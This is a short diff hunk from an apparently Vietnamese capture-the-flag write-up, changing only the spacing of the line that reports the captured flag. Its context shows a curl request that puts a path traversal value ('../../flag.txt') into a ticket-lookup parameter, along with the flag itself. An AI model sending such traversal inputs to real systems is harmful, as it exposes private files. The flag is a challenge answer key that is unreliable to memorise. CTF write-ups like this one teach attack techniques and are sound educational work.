@@ -38,4 +38,4 @@ WORKDIR container là `/app` (xem `Dockerfile`), nên `./tickets/` = `/app/ticke
 curl -s -X POST "http://HOST:PORT/get-file?pnr=../../flag.txt"
 ```
 
-->Flag: `NNS{WH0op5_You_found_4_p4th_7R4v3rs4l_in_My_cod3}`
+-> Flag: `NNS{WH0op5_You_found_4_p4th_7R4v3rs4l_in_My_cod3}`
